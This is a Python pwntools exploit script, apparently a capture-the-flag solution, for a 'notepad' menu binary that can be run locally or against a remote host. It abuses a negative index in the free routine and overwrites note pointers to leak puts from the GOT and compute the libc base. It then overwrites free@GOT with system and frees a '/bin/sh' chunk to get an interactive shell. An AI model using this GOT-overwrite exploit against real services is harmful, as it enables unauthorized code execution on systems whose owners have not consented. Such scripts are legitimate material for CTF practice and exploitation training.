from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./notepad")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./notepad")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("libc.so.6")
	elf = ELF("./notepad")

def add(size,content):
	p.sendlineafter(">> ","1")
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",content)

def edit(index,size,content):
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",content)

def show(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))

def free(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("Index: ",str(index))

def set_key(key):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","1")
	p.sendafter("Key: ",key)

def encrypt(index):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))
	
def decrypt(index):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))
	
def debugf():
	gdb.attach(p,"b *0x0000000000402077\nb free\nb *0x402471")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
size = 0x61
for i in range(20):
	add(size,(chr(ord("a")+i))*size)
set_key("\x50\x60".ljust(7,"\x00")+"\x01")
target = 0x6040E0
ori = 0x604E80
index = -151 + 5
debugf()
#print index
free(index)
add(size-0x10,"a"*(size-0x10))
payload = p64(elf.got["puts"]) + p64(1) + p64(0x51)
#debugf()
edit(20,len(payload),payload)
show(16)
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
payload = p64(elf.got["free"]) + p64(1) + p64(0x51)
edit(20,len(payload),payload)
payload = p64(libc.symbols["system"])
edit(16,len(payload),payload)
edit(0,8,"/bin/sh\x00")
free(0)
p.interactive()
